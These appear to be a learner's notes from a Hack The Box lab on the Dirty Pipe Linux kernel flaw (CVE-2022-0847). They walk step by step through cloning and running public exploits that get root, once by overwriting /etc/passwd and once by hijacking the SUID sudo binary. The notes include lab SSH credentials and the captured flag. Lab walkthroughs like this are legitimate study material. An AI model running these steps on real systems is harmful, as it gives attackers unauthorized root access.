# Dirty Pipe

A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux.

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847

--> Similar to DirtyCow

All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability.

Android phones are also affected.

## Verify Kernel Version
uname -r

5.13.0-46-generic


## Download Dirty Pipe Exploit

git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

## Exploitation

./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)

## 2nd way of exploitation

### Find SUID binairies

find / -perm -4000 2>/dev/null

/usr/bin/sudo

### Exploit

./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

\# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)

## LAB

ssh htb-student@10.129.204.55
HTB_@cademy_stdnt!

git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

ls
compile.sh  exploit-1  exploit-1.c  exploit-2  exploit-2.c  README.md
cd ..
scp -r CVE-2022-0847-DirtyPipe-Exploits htb-student@10.129.204.55:/home/htb-student/

htb-student@ubuntu:~$ ls
CVE-2022-0847-DirtyPipe-Exploits
htb-student@ubuntu:~$ cd CVE-2022-0847-DirtyPipe-Exploits/

./exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
system() function call seems to have failed :(

find / -perm -4000 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/sudo
...

./exploit-2 /usr/bin/sudo
cat /root/flag.txt
HTB{D1rTy_DiR7Y}